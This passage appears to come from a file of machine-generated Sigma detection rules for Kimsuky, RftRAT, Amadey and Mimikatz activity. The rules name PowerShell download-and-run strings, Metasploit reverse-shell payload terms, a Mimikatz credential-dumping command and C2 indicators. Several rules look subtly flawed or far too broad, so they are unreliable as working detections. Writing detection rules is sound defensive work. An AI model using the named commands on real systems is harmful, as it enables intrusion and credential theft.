            "Development or administrative use of Ruby, Python, Java, or Perl with strings resembling Metasploit-related terms"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.exploitation_for_client_execution",
            "car.2013-05-001",
            "threat.kimsuky"
          ],
          "ttp_id": "unknown",
          "technique_name": "Metasploit",
          "generation_method": "langchain",
          "id": "9f9640dc-fbf9-42f3-857c-da21f00cab33"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "status": "success",
        "rule": {
          "title": "Kimsuky Group PowerShell Execution",
          "description": "Detects potential execution via PowerShell associated with Kimsuky Group activity. This rule focuses on behavioral indicators of malicious PowerShell usage, such as encoded commands or suspicious command-line arguments, to identify potentially malicious execution attempts.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-enc",
                "-encodedcommand",
                "-e",
                "-nop",
                "-noninteractive",
                "-command",
                "IEX",
                "Invoke-Expression",
                "DownloadString",
                "WebClient",
                "Invoke-WebRequest",
                "-WindowStyle hidden",
                "-ExecutionPolicy Bypass"
              ]
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative scripts using PowerShell with encoded commands or non-interactive execution",
            "Software deployment or management tools invoking PowerShell with restricted visibility",
            "PowerShell scripts used in automated testing or CI/CD pipelines"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1059.001",
            "threat.kimsuky"
          ],
          "ttp_id": "unknown",
          "technique_name": "PowerShell",
          "generation_method": "langchain",
          "id": "72001a16-0771-421c-816c-7e2fc84a9649"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Control",
        "status": "success",
        "rule": {
          "title": "RftRAT C2 Communication and Persistence",
          "description": "Detects RftRAT communicating with its C2 server and establishing persistence via file creation",
          "logsource": {
            "category": "network_connection",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_c2_domain": {
              "DestinationHostname|contains": "prohomepage.net"
            },
            "selection_c2_ip": {
              "DestinationIp": "45.76.93.204",
              "DestinationPort": "56001"
            },
            "selection_file": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "%APPDATA%\\asc\\t1.pb"
            },
            "condition": "selection_c2_domain or selection_c2_ip or selection_file"
          },
          "falsepositives": [
            "Legitimate user accessing prohomepage.net for non-malicious purposes",
            "Administrative use of cmd.exe with scripts in AppData",
            "Network misconfiguration causing outbound traffic to 45.76.93.204:56001"
          ],
          "level": "high",
          "tags": [
            "attack.t1071.001",
            "attack.command-and-control",
            "malware.rat.rfrat"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Control",
          "generation_method": "langchain",
          "id": "e07d4865-cca3-41a9-80b5-9f9e06084209"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Info Stealing",
        "status": "success",
        "rule": {
          "title": "Info Stealing Malware Dropped in ALLUSERSPROFILE Semantec Directory",
          "description": "Detects execution of suspicious files named GBIA.exe and GBIC.exe dropped in the %ALLUSERSPROFILE%\\semantec directory, which is indicative of info-stealing malware targeting web browser data.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_gbia": {
              "Image|endswith": "\\semantec\\GBIA.exe"
            },
            "selection_gbic": {
              "Image|endswith": "\\semantec\\GBIC.exe"
            },
            "condition": "selection_gbia or selection_gbic"
          },
          "falsepositives": [
            "Legitimate software mistakenly placed in the semantec directory (unlikely due to typo in path)",
            "Administrative scripts deploying tools to this specific path (rare and suspicious by default)"
          ],
          "level": "high",
          "tags": [
            "attack.credential_access",
            "attack.T1555",
            "malware.info-stealer",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Info Stealing",
          "generation_method": "langchain",
          "id": "3f85a58e-ecbb-42b9-8d2b-8419b8acd757"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "status": "success",
        "rule": {
          "title": "Suspicious Process Injection via ipcheck.dll into Explorer and RuntimeBroker",
          "description": "Detects suspicious process injection activity where ipcheck.dll is injected into explorer.exe and runtimebroker.exe processes, potentially indicating defense evasion through process injection.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_image_explorer": {
              "Image|endswith": "\\explorer.exe"
            },
            "selection_image_runtimebroker": {
              "Image|endswith": "\\RuntimeBroker.exe"
            },
            "selection_module_loaded": {
              "Image|endswith": "\\ipcheck.dll"
            },
            "selection_suspicious_parent": {
              "ParentImage|contains": "semantec\\taskhosts.exe"
            },
            "condition": "(selection_image_explorer or selection_image_runtimebroker) and selection_module_loaded and selection_suspicious_parent"
          },
          "falsepositives": [
            "Legitimate software maintenance tools loading DLLs into system processes",
            "Antivirus or endpoint protection agents injecting into host processes for monitoring"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.T1055",
            "custom.sigma",
            "custom.process_injection"
          ],
          "ttp_id": "unknown",
          "technique_name": "Process Injection",
          "generation_method": "langchain",
          "id": "f415b722-43e2-4ca2-b3f1-f5f2eb9e8138"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "Command and Scripting Interpreter - PowerShell and Metasploit Detection",
          "description": "Detects the use of PowerShell and Metasploit as command and scripting interpreters, commonly associated with adversary execution. Focuses on process creation events with suspicious command-line arguments indicative of malicious activity.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-enc",
                "-e",
                "-EncodedCommand",
                "Invoke-Expression",
                "IEX",
                "DownloadString",
                "&",
                "%",
                "\\",
                "\\\\",
                "\\\\\\\\"
              ]
            },
            "selection_metasploit": {
              "Image|endswith": [
                "\\msf.exe",
                "\\msfcli",
                "\\msfconsole",
                "\\msfvenom"
              ],
              "CommandLine|contains": [
                "-p",
                "--payload",
                "reverse_tcp",
                "reverse_http",
                "reverse_https",
                "meterpreter"
              ]
            },
            "condition": "selection_powershell or selection_metasploit"
          },
          "falsepositives": [
            "Legitimate administrative use of PowerShell with encoded commands or Metasploit in penetration testing environments",
            "Development or scripting activities involving base64-encoded data or remote download patterns",
            "Authorized red team operations using Metasploit Framework tools"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1059",
            "detection.rule.quality.improved",
            "custom.windows",
            "custom.powershell",
            "custom.metasploit"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "langchain",
          "id": "b0453951-c20a-4974-a81d-fc9acae6f145"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "PowerShell and Metasploit Command and Scripting Interpreter Detection",
          "description": "Detected use of PowerShell and Metasploit for potential malicious command execution. This rule identifies suspicious command-line patterns associated with PowerShell execution and Metasploit framework usage, focusing on known malicious behaviors such as encoded commands, bypassing execution policy, and common Metasploit artifacts.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe"
            },
            "selection_command_flags": {
              "CommandLine|contains": [
                "-enc",
                "-encodecommand",
                "-executionpolicy",
                "bypass",
                "-nop",
                "-noninteractive"
              ]
            },
            "selection_metasploit": {
              "CommandLine|contains": [
                "msf",
                "metasploit"
              ]
            },
            "condition": "selection_powershell and selection_command_flags or selection_powershell and selection_metasploit"
          },
          "falsepositives": [
            "Legitimate administrative use of PowerShell with encoded commands or execution policy bypass",
            "Authorized penetration testing activities using Metasploit",
            "Development or testing environments where Metasploit is used for legitimate purposes",
            "Automated scripting tools that use PowerShell with restricted command-line arguments"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1059",
            "detection.emerging",
            "threat.hacking",
            "tool.metasploit",
            "behavior.command_and_scripting_interpreter"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "langchain",
          "id": "02dc9374-ba43-4004-91c0-5babfc166a90"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Execution through API",
        "status": "success",
        "rule": {
          "title": "RftRAT Command File Write to APPDATA",
          "description": "Detects RftRAT writing received commands to a specific file in the APPDATA directory before decryption. This behavior is associated with execution through API.",
          "logsource": {
            "category": "file_event",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "TargetFilename|endswith": "\\\\asc\\\\t1.pb"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate application writing to %APPDATA%\\\\asc\\\\t1.pb (unlikely, as this path is highly specific)",
            "Malware analysis or replication in controlled environments"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.T1106",
            "malware.rat.rfrat"
          ],
          "ttp_id": "unknown",
          "technique_name": "Execution through API",
          "generation_method": "langchain",
          "id": "5542a5d8-5861-459b-87f3-82143d64b633"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "UAC Bypass",
        "status": "success",
        "rule": {
          "title": "UAC Bypass via ICMLuaUtil",
          "description": "Detects UAC bypass attempts using ICMLuaUtil, a component associated with privilege escalation by leveraging COM interface manipulation to execute code with elevated privileges.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": "\\ICMLuaUtil.exe",
              "CommandLine|contains": "LaunchAdvancedOptions"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate system usage by authorized applications or administrative tools that invoke ICMLuaUtil for legitimate control panel operations"
          ],
          "level": "high",
          "tags": [
            "attack.privilege_escalation",
            "attack.t1548.002",
            "attack.t1088",
            "custom.detection-rule",
            "custom.windows-security"
          ],
          "ttp_id": "unknown",
          "technique_name": "UAC Bypass",
          "generation_method": "langchain",
          "id": "0d2ab478-514c-40e6-ad01-b4bf59e6a2ea"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Process Hollowing",
        "status": "success",
        "rule": {
          "title": "RftRAT Process Hollowing Detection",
          "description": "Detects RftRAT using process hollowing technique for defense evasion. Monitors for suspicious process creation patterns associated with known malware behavior, including hollowing indicators like suspended processes and later resume, along with command-line artifacts.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_rftRAT": {
              "CommandLine|contains": "RftRAT"
            },
            "selection_hollowing": {
              "CommandLine|contains": [
                "-CreateSuspended",
                "-WriteProcessMemory",
                "-ResumeThread"
              ],
              "Image|endswith": [
                "\\svchost.exe",
                "\\explorer.exe",
                "\\lsass.exe",
                "\\winlogon.exe"
              ],
              "ParentImage|endswith": [
                "\\powershell.exe",
                "\\wscript.exe",
                "\\cscript.exe",
                "\\mshta.exe"
              ]
            },
            "condition": "selection_rftRAT or selection_hollowing"
          },
          "falsepositives": [
            "Legitimate administrative scripts using PowerShell to manipulate processes in controlled environments",
            "Software debugging or testing tools that simulate process injection"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.T1055",
            "malware.rat.rftRAT",
            "detection.rule.sigma"
          ],
          "ttp_id": "unknown",
          "technique_name": "Process Hollowing",
          "generation_method": "langchain",
          "id": "3a1692ca-2cfb-4cf3-85d2-d00e0ea7fb26"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Credential Access",
        "status": "success",
        "rule": {
          "title": "Mimikatz Process Execution Detected",
          "description": "Detects execution of mimikatz.exe which is commonly used for credential dumping and other credential access techniques.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": "\\mimikatz.exe"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate use of Mimikatz by system administrators or security professionals during authorized penetration testing or red team exercises"
          ],
          "level": "critical",
          "tags": [
            "attack.credential_access",
            "attack.t1003",
            "custom.mimikatz",
            "custom.credential_dumping"
          ],
          "ttp_id": "unknown",
          "technique_name": "Credential Access",
          "generation_method": "langchain",
          "id": "0722aef6-06df-4817-9596-f75b416b5a69"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Control",
        "status": "success",
        "rule": {
          "title": "C2 Server Communication via Suspicious Process",
          "description": "Detects potential command and control (C2) activity where a process communicates with a C&C server. Focuses on suspicious network connections initiated by common execution processes.",
          "logsource": {
            "category": "network_connection",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\wscript.exe",
                "\\cscript.exe",
                "\\mshta.exe",
                "\\rundll32.exe"
              ],
              "DestinationIp": "*"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative scripts using command-line tools for remote management",
            "Automated patch management or monitoring tools initiating outbound connections",
            "Software updates initiated through scriptable interfaces"
          ],
          "level": "high",
          "tags": [
            "attack.t1071",
            "attack.t1571",
            "attack.command-and-control",
            "custom.windows",
            "custom.network",
            "custom.c2"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Control",
          "generation_method": "langchain",
          "id": "7848f6a4-c18e-455e-811b-4799694bf3e5"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Remote Desktop Protocol",
        "status": "success",
        "rule": {
          "title": "Remote Desktop Protocol Usage via RDP Wrapper",
          "description": "Detects potential misuse of Remote Desktop Protocol through the use of RDP Wrapper, which may indicate lateral movement activity. This rule focuses on process creation events associated with RDP-related behavior and known tooling.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_rdp_wrapper": {
              "Image|endswith": [
                "\\rdpwrap.dll",
                "\\RDPConf.exe",
                "\\RDPCheck.exe",
                "\\RDPWrap.ini"
              ],
              "CommandLine|contains": "3389"
            },
            "selection_port_usage": {
              "CommandLine|contains": [
                "3389",
                ":3389"
              ],
              "ParentImage|endswith": [
                "\\svchost.exe",
                "\\lsass.exe"
              ]
            },
            "condition": "selection_rdp_wrapper or selection_port_usage"
          },
          "falsepositives": [
            "Legitimate system administrators using RDP for remote management",
            "Use of RDP Wrapper for enabling RDP on non-Server Windows editions in lab or development environments"
          ],
          "level": "high",
          "tags": [
            "attack.t1021.001",
            "attack.lateral_movement",
            "custom.rdp",
            "custom.rdp_wrapper",
            "custom.lateral_movement"
          ],
          "ttp_id": "unknown",
          "technique_name": "Remote Desktop Protocol",
          "generation_method": "langchain",
          "id": "da190372-d711-48b6-9654-57aa86e0ac5c"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "status": "success",
        "rule": {
          "title": "PowerShell Activity Detected via NLP Pattern Matching",
          "description": "Detects PowerShell activity using behavioral patterns and command-line arguments commonly associated with malicious use, based on NLP pattern matching.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-enc",
                "-encodedcommand",
                "-exec",
                "-executionpolicy",
                "Invoke-Expression",
                "IEX",
                "DownloadString",
                "WebClient",
                "Invoke-WebRequest",
                "Invoke-RestMethod",
                "-WindowStyle hidden",
                "-noninteractive",
                "-nop",
                "-command"
              ]
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative scripts using PowerShell with encoded commands or restricted execution policies",
            "Software deployment or patch management tools invoking PowerShell remotely",
            "PowerShell-based monitoring or backup solutions",
            "User-initiated automation scripts with obfuscated commands"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1059.001",
            "detection.emulation",
            "behavior.powershell.usage"
          ],
          "ttp_id": "unknown",
          "technique_name": "PowerShell",
          "generation_method": "langchain",
          "id": "909389df-4e4c-4ac0-9464-f35034c2e280"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "File and Directory Discovery",
        "status": "success",
        "rule": {
          "title": "Amadey File and Directory Discovery Targeting South Korean Product Names",
          "description": "Detects Amadey malware performing file and directory discovery with a focus on searching for product names from South Korean companies.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\wscript.exe",
                "\\cscript.exe"
              ],
              "CommandLine|contains": [
                "dir",
                "ls",
                "findstr",
                "where",
                "Get-ChildItem",
                "gci",
                "ls",
                "dir",
                "find"
              ],
              "CommandLine|contains|all": [
                "\\",
                ".exe"
              ]
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative scripts performing directory enumeration",
            "System maintenance tools scanning for executable files",
            "User-initiated file searches via command line"
          ],
          "level": "high",
          "tags": [
            "attack.discovery",
            "attack.T1083",
            "malware.amadey",
            "custom.windows",
            "custom.sokorean-targeting"
          ],
          "ttp_id": "unknown",
          "technique_name": "File and Directory Discovery",
          "generation_method": "langchain",
          "id": "63a236d8-cc30-46f9-b2b9-9421d1c34deb"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Defensive Evasion",
        "status": "success",
        "rule": {
          "title": "Suspicious Rundll32 Execution via Uncommon Parameters",
          "description": "Detects suspicious use of rundll32.exe with command line parameters commonly associated with malicious code execution, such as script loading, WMI, or encoded commands. This behavior is often abused for defensive evasion.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_rundll32": {
              "Image|endswith": "\\rundll32.exe"
            },
            "selection_script_load": {
              "CommandLine|contains": [
                "javascript:",
                "vbscript:",
                "data: "
              ]
            },
            "selection_wmi_or_debug": {
              "CommandLine|contains": [
                "WMIC",
                "-debug",
                "/debug"
              ]
            },
            "selection_encoded": {
              "CommandLine|contains": [
                "-enc",
                "-e",
                "/e",
                "-b",
                "/b"
              ]
            },
            "selection_network": {
              "CommandLine|contains": [
                "http",
                "https",
                "\\\\"
              ]
            },
            "condition": "selection_rundll32 and (selection_script_load or selection_wmi_or_debug or selection_encoded or selection_network)"
          },
          "falsepositives": [
            "Legitimate use of rundll32.exe to load DLLs via standard Windows paths (e.g., C:\\\\Windows\\\\System32\\\\)",
            "Administrative scripts invoking rundll32 with HTTP for configuration",
            "Software installers using rundll32 in embedded contexts"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.T1218.011",
            "custom.windows",
            "custom.execution",
            "custom.rundll32"
          ],
          "ttp_id": "unknown",
          "technique_name": "Defensive Evasion",
          "generation_method": "langchain",
          "id": "d44fb879-7838-4256-a96f-c694804013c1"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "System Information Discovery",
        "status": "success",
        "rule": {
          "title": "Amadey System Information Discovery via Command Line",
          "description": "Detects Amadey malware collecting system information from the infected system using command-line tools",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "CommandLine|contains": [
                "systeminfo",
                "wmic",
                "query user",
                "net user",
                "ipconfig",
                "arp -a",
                "netstat -ano",
                "tasklist",
                "net view",
                "net localgroup",
                "whoami",
                "/all"
              ],
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\cscript.exe",
                "\\wscript.exe"
              ]
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate system administration activities using command-line tools for troubleshooting or inventory",
            "Automated IT management scripts that gather system information",
            "Penetration testing or red team exercises"
          ],
          "level": "high",
          "tags": [
            "attack.discovery",
            "attack.T1087",
            "attack.T1012",
            "malware.command-and-control.amadey"
          ],
          "ttp_id": "unknown",
          "technique_name": "System Information Discovery",
          "generation_method": "langchain",
          "id": "32699665-201c-463f-8c23-75c66ea7735a"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "File and Directory Discovery",
        "status": "success",
        "rule": {
          "title": "RftRAT File and Directory Discovery via Specific Path Names",
          "description": "Detects RftRAT using specific path names for saving data, indicative of file and directory discovery behavior.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\wscript.exe",
                "\\cscript.exe",
                "\\mshta.exe"
              ],
              "CommandLine|contains": "A1CCA2EC-C09F-D33C-4317-7F71F0E2A976_0"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative scripts using similar path patterns in command lines (unlikely but possible)",
            "Test or debugging scripts that reference UUID-like strings"
          ],
          "level": "high",
          "tags": [
            "attack.discovery",
            "attack.T1083",
            "malware.rat.rfrat"
          ],
          "ttp_id": "unknown",
          "technique_name": "File and Directory Discovery",
          "generation_method": "langchain",
          "id": "59a628f6-1001-4344-8f81-fac20ba91785"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Credential Access",
        "status": "success",
        "rule": {
          "title": "Mimikatz Execution for Credential Theft",
          "description": "Detects the execution of Mimikatz, a well-known tool used for credential dumping and privilege escalation, by identifying the process image name and common command-line arguments associated with credential access techniques.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_image": {
              "Image|endswith": "\\mimikatz.exe"
            },
            "selection_command": {
              "CommandLine|contains": "sekurlsa::logonpasswords"
            },
            "condition": "selection_image or (selection_command)"
          },
          "falsepositives": [
            "Legitimate administrative tools that may use similar command-line arguments for debugging or diagnostic purposes",
            "Security research or red teaming activities using Mimikatz in controlled environments",
            "Custom applications that inadvertently include strings similar to Mimikatz commands"
          ],
          "level": "high",
          "tags": [
            "attack.credential_access",
            "attack.t1003",
            "custom.mimikatz",
            "custom.credential_dumping"
          ],
          "ttp_id": "unknown",
          "technique_name": "Credential Access",
          "generation_method": "langchain",
          "id": "1e71a483-4cca-470e-a45f-bdac4c323aea"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Collection",
        "status": "success",
        "rule": {
          "title": "Keylogger Detection via Process Creation",
          "description": "Detects potential use of keylogger by identifying suspicious process creation events with command-line indicators associated with keystroke logging activity.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "CommandLine|contains": [
                "keylogger",
                "-keylog",
                "--keylog",
                "logkeys",
                "keylog"
              ],
              "Image|endswith": [
                "\\logger.exe",
                "\\keylogger.exe",
                "\\logkeys.exe"
              ]
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate system monitoring tools that use 'keylog' in command line or process name",
            "Security software with 'keylogger' in path or arguments for testing purposes",
            "Developer tools or scripts that reference 'keylog' in benign context"
          ],
          "level": "high",
          "tags": [
            "attack.collection",
            "attack.t1074",
            "detection.keylogger",
            "windows.security"
          ],
          "ttp_id": "unknown",
          "technique_name": "Collection",
          "generation_method": "langchain",
          "id": "a94f1fd1-7b8f-4be7-828f-5ebb471ff6f2"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "System Information Discovery",
        "status": "success",
        "rule": {
          "title": "RftRAT C&C Communication and Command Results",
          "description": "Detects RftRAT saving C&C communication and command results as part of System Information Discovery",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "\\AppData\\"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate system scripting that uses echo to write data to files in AppData"
          ],
          "level": "high",
          "tags": [
            "attack.discovery",
            "attack.T1082",
            "malware.rat.rfrat"
          ],
          "ttp_id": "unknown",
          "technique_name": "System Information Discovery",
          "generation_method": "langchain",
          "id": "1b5c2c48-4085-442e-aaf3-975093d6b9c1"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "AutoIt Script Execution for Malicious Purposes",
          "description": "Detects execution of AutoIt scripts which can be used for malicious activities such as code execution and evasion. AutoIt is often abused to run scripts that perform actions without user interaction.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_image": {
              "Image|endswith": [
                "\\autoit3.exe",
                "\\AutoIt3_x64.exe"
              ]
            },
            "selection_command": {
              "CommandLine|contains": [
                "/ErrorStdOut",
                "-",
                "/in",
                ".a3x",
                ".au3"
              ]
            },
            "condition": "selection_image and selection_command"
          },
          "falsepositives": [
            "Legitimate use of AutoIt by system administrators or developers for automation tasks",
            "Deployment tools using AutoIt scripts in trusted environments"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.T1059",
            "custom.autoit",
            "custom.scripting",
            "custom.malicious-script"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "langchain",
          "id": "9fe70e44-cbd2-44c6-b174-daba6c227a07"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "status": "success",
        "rule": {
          "title": "RftRAT Injection into svchost.exe",
          "description": "Detects RftRAT injecting into svchost.exe process by monitoring process creation events with suspicious command-line characteristics.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": "\\svchost.exe",
              "CommandLine|contains": "RftRAT"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate system services spawning svchost.exe with unusual command lines (rare)",
            "Administrative scripts that reference RftRAT in command line for benign purposes (e.g., malware analysis)"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.T1055",
            "malware.rat",
            "custom.rftRAT"
          ],
          "ttp_id": "unknown",
          "technique_name": "Process Injection",
          "generation_method": "langchain",
          "id": "c8290f50-ad48-40ed-92dd-b4c6ee21cd4c"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "status": "success",
        "rule": {
          "title": "Create or Modify System Process via NLP Pattern Matching",
          "description": "Detected Create or Modify System Process activity via NLP pattern matching indicating potential persistence mechanism installation",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd_spawn": {
              "ParentImage|endswith": [
                "\\svchost.exe",
                "\\wininit.exe",
                "\\services.exe",
                "\\lsass.exe",
                "\\winlogon.exe"
              ],
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\wscript.exe",
                "\\cscript.exe",
                "\\mshta.exe",
                "\\rundll32.exe",
                "\\regsvr32.exe"
              ],
              "CommandLine|contains": [
                "/c",
                "/k",
                "-c",
                "-EncodedCommand",
                "-enc",
                "CreateProcess",
                "ShellExecute"
              ]
            },
            "selection_susp_execution": {
              "Image|endswith": [
                "\\rundll32.exe",
                "\\regsvr32.exe",
                "\\mshta.exe",
                "\\wmic.exe"
              ],
              "CommandLine|contains": [
                ".dll",
                ".ocx",
                ".js",
                ".vbs",
                ".jse",
                ".vbe",
                "CreateProcess"
              ]
            },
            "condition": "selection_cmd_spawn or selection_susp_execution"
          },
          "falsepositives": [
            "Legitimate administrative scripts executed via command-line tools",
            "Scheduled tasks spawning scripts from system binaries",
            "Software deployment tools using rundll32 or regsvr32 for component registration",
            "System updates or patching processes"
          ],
          "level": "high",
          "tags": [
            "attack.t1136",
            "attack.t1501",
            "attack.t1053",
            "attack.t1204",
            "attack.g0005",
            "detection.rule.quality.high",
            "custom.persistence"
          ],
          "ttp_id": "unknown",
          "technique_name": "Create or Modify System Process",
          "generation_method": "langchain",
          "id": "17721dcf-5c83-463e-803b-d2aacbbdd306"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "status": "success",
        "rule": {
          "title": "Detected Process Injection via NLP Pattern Matching",
          "description": "Detects potential process injection activity by identifying suspicious process creation patterns commonly associated with code injection techniques, such as reflective loading, APC injection, or hollowing, using behavioral indicators in command-line arguments and image paths.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_susp_image": {
              "Image|endswith": [
                "\\rundll32.exe",
                "\\regsvr32.exe",
                "\\mshta.exe",
                "\\certutil.exe",
                "\\cmstp.exe"
              ],
              "CommandLine|contains": [
                "\\",
                ":",
                "http",
                "base64",
                "-enc",
                "Invoke",
                "Reflective",
                "Load",
                "Shellcode",
                "VirtualAlloc",
                "WriteProcessMemory",
                "CreateRemoteThread"
              ]
            },
            "selection_susp_parent": {
              "ParentImage|endswith": [
                "\\explorer.exe",
                "\\winlogon.exe",
                "\\lsass.exe",
                "\\svchost.exe"
              ],
              "Image|endswith": [
                "\\dllhost.exe",
                "\\rundll32.exe",
                "\\regsvr32.exe"
              ]
            },
            "selection_high_risk_cmd": {
              "CommandLine|contains": [
                "/c",
                "cmd /k",
                "powershell -nop",
                "-exec bypass",
                "IEX",
                "Invoke-Expression",
                "DownloadString",
                "Net.WebClient",
                "reflection.assembly",
                "load_with_params"
              ]
            },
            "condition": "selection_susp_image or selection_susp_parent or selection_high_risk_cmd"
          },
          "falsepositives": [
            "Legitimate administrative scripts using certutil or regsvr32 for file download or registration",
